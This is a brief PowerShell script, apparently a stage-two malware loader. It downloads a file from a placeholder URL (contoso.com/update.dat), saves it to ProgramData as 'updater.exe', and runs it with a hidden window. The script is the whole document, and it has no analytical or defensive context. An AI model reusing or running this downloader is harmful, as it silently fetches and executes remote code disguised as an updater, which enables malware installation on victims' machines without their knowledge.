
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://contoso.com/update.dat",
    [string]$PayloadPath = 'C:\ProgramData\updater.exe'
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $PayloadPath)
Start-Process -FilePath $PayloadPath -WindowStyle Hidden
$ProgressPreference = "SilentlyContinue"
